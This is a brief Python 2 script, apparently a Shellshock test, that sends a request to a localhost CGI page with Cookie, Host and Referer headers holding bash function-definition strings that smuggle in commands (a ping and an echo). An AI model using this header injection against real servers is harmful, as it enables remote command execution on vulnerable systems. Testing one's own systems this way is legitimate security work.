#!/usr/bin/python

import urllib2
req = urllib2.Request('http://localhost/test.cgi')
req.add_header("Cookie", "() { ; } ; ping -c 3 127.0.0.1")
req.add_header("Host", "() { ; } ; echo asdf")
req.add_header("Referer", "() { ; } ; echo asdf")
r = urllib2.urlopen(req)
data = r.read()
print(data)

